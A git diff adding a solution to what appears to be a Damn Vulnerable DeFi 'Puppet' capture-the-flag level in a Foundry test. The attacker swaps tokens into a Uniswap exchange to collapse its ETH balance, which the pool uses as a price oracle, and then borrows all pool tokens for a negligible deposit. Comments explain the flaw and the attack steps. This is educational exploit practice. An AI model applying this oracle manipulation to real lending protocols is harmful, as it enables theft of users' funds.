@@ -100,6 +100,12 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), 1000 ether); // approving uniswap for exchange
+        uniswapExchange.tokenToEthSwapInput(1000 ether, 1, DEADLINE); // getting tokens as much we can to decrease the uniswap eth balance
+        uint256 deposit = puppetPool.calculateDepositRequired(dvt.balanceOf(address(puppetPool))); // calculate the deposit amount
+        puppetPool.borrow{value: deposit}(dvt.balanceOf(address(puppetPool))); // borrow all the tokens for minimum deposit
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -125,3 +131,12 @@ contract Puppet is Test {
         return numerator / denominator;
     }
 }
+
+// Vulnerability:
+// pool uses uniswap's eth balance as oracle to calculate the deposit required. If attacker get all ETH in exchange for tokens from uniswap exchange then
+// deposit required will be 0 or neglible. Through this attacker no need to deposit anything to borrow tokens and easily all tokens from the pool. Basically poor selection of
+// oracle is used in pool.
+
+// Attack steps:
+// 1. get all ETH from uniswap or decrease the ETH balance in exhange for tokens.
+// 2. then execute borrow function in pool with initial balance or current balance of pool as borrowAmount.
